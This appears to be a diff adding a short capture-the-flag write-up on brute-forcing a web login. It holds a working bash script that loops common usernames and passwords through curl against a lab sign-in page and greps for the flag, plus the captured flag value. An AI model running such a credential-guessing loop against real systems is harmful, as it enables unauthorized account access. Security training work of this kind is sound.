@@ -1,0 +1,15 @@
+# Brute Force
+The basis of a brute force consists of an attacker submitting many passwords or passphrases with the hope of eventually guessing correctly.
+
+IP=192.168.1.67
+usernames=(root admin test guest info adm mysql user administrator oracle ftp pi puppet ansible ec2-user vagrant azureuser)
+passwords=(root admin test shadow matrix ghost sleeper slider guest 123456 aaron jun rebecca einstein anna sara singnin amy 12345 !@#$%^ 555555 tracy  password1)
+
+for user in ${usernames[@]}; do
+  for pass in ${passwords[@]}; do
+    echo "http://$IP/index.php?page=signin&username=${user}&password=${pass}&Login=Login#"
+	  curl -X POST "http://$IP/index.php?page=signin&username=${user}&password=${pass}&Login=Login#" | grep 'flag' && exit 1 || continue
+  done
+done
+
+The flag is : b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2
